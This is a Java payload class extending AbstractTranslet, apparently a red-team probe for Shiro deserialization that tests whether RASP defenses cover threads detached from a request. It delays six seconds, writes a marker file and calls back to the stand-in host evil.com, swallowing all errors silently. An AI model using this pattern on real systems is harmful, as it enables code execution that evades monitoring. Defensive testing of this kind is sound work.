import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;

/** RT轮探针：延迟/异步执行——静态块只起守护线程（立即返回），线程睡眠 6s（HTTP 响应已返回、
 *  RASP 请求上下文应已销毁）后执行 nio 写标记 + 网络回连。
 *  用途：测试 RASP 钩子对「无请求上下文线程」的覆盖。 */
public class PwnAsync extends AbstractTranslet {
    static {
        try {
            Thread t = new Thread(new Runnable() {
                public void run() {
                    try {
                        Thread.sleep(6000L);
                    } catch (InterruptedException e) {
                        return;
                    }
                    // 动作1：java.nio 写标记
                    try {
                        java.nio.file.Files.write(
                            java.nio.file.Paths.get("/tmp/pwn_shiro_async"),
                            "pwn".getBytes("UTF-8"));
                    } catch (Throwable t2) {
                        // 静默
                    }
                    // 动作2：网络回连（独立 try，避免动作1被拦牵连）
                    try {
                        java.net.URL u = new java.net.URL("http://evil.com:8000/rt/rt_async_r1");
                        java.net.HttpURLConnection c = (java.net.HttpURLConnection) u.openConnection();
                        c.setConnectTimeout(5000);
                        c.setReadTimeout(5000);
                        c.getResponseCode();
                    } catch (Throwable t3) {
                        // 静默
                    }
                }
            });
            t.setDaemon(true);
            t.start();
        } catch (Throwable t) {
            // 静默
        }
    }

    public PwnAsync() {}

    public void transform(com.sun.org.apache.xalan.internal.xsltc.DOM d,
                          com.sun.org.apache.xml.internal.serializer.SerializationHandler[] h) {}

    public void transform(com.sun.org.apache.xalan.internal.xsltc.DOM d,
                          com.sun.org.apache.xml.internal.dtm.DTMAxisIterator i,
                          com.sun.org.apache.xml.internal.serializer.SerializationHandler h) {}
}
